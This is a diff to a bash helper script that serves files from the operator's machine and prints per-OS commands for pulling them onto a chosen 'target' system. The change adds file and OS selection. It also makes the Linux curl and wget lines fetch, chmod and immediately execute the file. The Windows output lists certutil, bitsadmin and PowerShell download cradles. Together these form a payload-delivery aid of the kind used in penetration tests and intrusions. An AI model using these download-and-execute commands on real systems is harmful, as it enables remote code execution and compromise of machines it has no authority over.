@@ -29,18 +29,59 @@ if [[ ${#FILES[@]} -eq 0 ]]; then
   echo
 else
   echo "Files in $(pwd):"
+  i=1
   for f in "${FILES[@]}"; do
-    echo "  - $f"
+    echo "  [$i] $f"
+    ((i++))
   done
   echo
 fi
 
+# Selection logic
+SELECTED_FILES=()
+if [[ ${#FILES[@]} -gt 0 ]]; then
+  while true; do
+    read -p "Enter number to select file: " selection
+    if [[ "$selection" =~ ^[0-9]+$ ]] && (( selection >= 1 && selection <= ${#FILES[@]} )); then
+      SELECTED_FILES=("${FILES[$((selection-1))]}")
+      echo "Selected: ${SELECTED_FILES[0]}"
+      break
+    fi
+    echo "Invalid selection. Please enter a number between 1 and ${#FILES[@]}."
+  done
+  echo
+fi
+
+# OS Selection logic
+TARGET_OS=""
+while true; do
+  echo "Target OS:"
+  echo "  [1] Linux"
+  echo "  [2] Windows"
+  read -p "Enter number to select OS: " os_selection
+  case "$os_selection" in
+    1)
+      TARGET_OS="Linux"
+      break
+      ;;
+    2)
+      TARGET_OS="Windows"
+      break
+      ;;
+    *)
+      echo "Invalid selection. Please enter 1 or 2."
+      ;;
+  esac
+done
+echo "Selected OS: $TARGET_OS"
+echo
+
 # Print download commands per file
 echo "========== Download commands (per file) =========="
-if [[ ${#FILES[@]} -eq 0 ]]; then
+if [[ ${#SELECTED_FILES[@]} -eq 0 ]]; then
   echo "No files to print commands for. You can still browse the directory index at http://$LOCAL_IP:$PORT/"
 else
-  for f in "${FILES[@]}"; do
+  for f in "${SELECTED_FILES[@]}"; do
     # URL-encode minimal characters for space -> %20 (safe enough for typical filenames)
     # A simple URL-escape for spaces and a few common chars:
     # IMPORTANT: Encode % first to avoid double-encoding!
@@ -49,19 +90,22 @@ else
     url_encoded="${url_encoded// /%20}"
     echo
     echo "File: $f"
-    echo "  Linux:"
-  echo "    curl -fsSL \"http://$LOCAL_IP:$PORT/$url_encoded\" -o \"$f\" && chmod +x \"$f\""
-  echo "    wget -q --show-progress -O \"$f\" \"http://$LOCAL_IP:$PORT/$url_encoded\" && chmod +x \"$f\""
-    echo
-    echo "  Windows (CMD):"
-    echo "    certutil -urlcache -split -f \"http://$LOCAL_IP:$PORT/$url_encoded\" \"$f\""
-    echo "    curl \"http://$LOCAL_IP:$PORT/$url_encoded\" -o \"%CD%\\$f\""
-    echo "    bitsadmin /transfer dl \"http://$LOCAL_IP:$PORT/$url_encoded\" \"%CD%\\$f\""
-    echo
-    echo "  Windows (PowerShell):"
-    echo "    PowerShell -Command \"Invoke-WebRequest -Uri 'http://$LOCAL_IP:$PORT/$url_encoded' -OutFile '$f'\""
-    echo "    PowerShell -Command \"(New-Object System.Net.WebClient).DownloadFile('http://$LOCAL_IP:$PORT/$url_encoded',''$f'')\""
-    echo "    PowerShell -Command \"iwr 'http://$LOCAL_IP:$PORT/$url_encoded' -OutFile '$f'\""
+    
+    if [[ "$TARGET_OS" == "Linux" ]]; then
+      echo "  Linux:"
+      echo "    curl -fsSL \"http://$LOCAL_IP:$PORT/$url_encoded\" -o \"$f\" && chmod +x \"$f\" && ./\"$f\""
+      echo "    wget -q --show-progress -O \"$f\" \"http://$LOCAL_IP:$PORT/$url_encoded\" && chmod +x \"$f\" && ./\"$f\""
+    elif [[ "$TARGET_OS" == "Windows" ]]; then
+      echo "  Windows (CMD):"
+      echo "    certutil -urlcache -split -f \"http://$LOCAL_IP:$PORT/$url_encoded\" \"$f\""
+      echo "    curl \"http://$LOCAL_IP:$PORT/$url_encoded\" -o \"%CD%\\$f\""
+      echo "    bitsadmin /transfer dl \"http://$LOCAL_IP:$PORT/$url_encoded\" \"%CD%\\$f\""
+      echo
+      echo "  Windows (PowerShell):"
+      echo "    PowerShell -Command \"Invoke-WebRequest -Uri 'http://$LOCAL_IP:$PORT/$url_encoded' -OutFile '$f'\""
+      echo "    PowerShell -Command \"(New-Object System.Net.WebClient).DownloadFile('http://$LOCAL_IP:$PORT/$url_encoded',''$f'')\""
+      echo "    PowerShell -Command \"iwr 'http://$LOCAL_IP:$PORT/$url_encoded' -OutFile '$f'\""
+    fi
   done
 fi
 
